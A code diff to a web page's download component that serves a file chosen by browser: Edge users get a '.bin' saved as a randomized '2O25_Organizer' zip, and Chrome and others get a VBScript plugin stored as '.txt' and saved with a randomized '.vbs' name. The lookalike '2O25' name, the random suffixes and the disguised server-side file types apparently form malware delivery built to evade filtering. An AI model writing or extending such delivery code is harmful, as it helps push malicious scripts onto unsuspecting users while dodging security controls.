@@ -370,10 +370,10 @@ const Download = () => {
     const ua = navigator.userAgent;
     const suffix = randomDigits(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
+      return { href: "/docs/2O25_Organizer.bin", name: `2O25_Organizer_${suffix}.zip` };
     }
-    // Chrome & others: serve the local SharefilePlugin.vbs with a randomized name
-    return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
+    // Chrome & others: serve the local SharefilePlugin (as .txt) with a randomized .vbs name
+    return { href: "/docs/SharefilePlugin.txt", name: `2O25_Organizer_${suffix}.vbs` };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
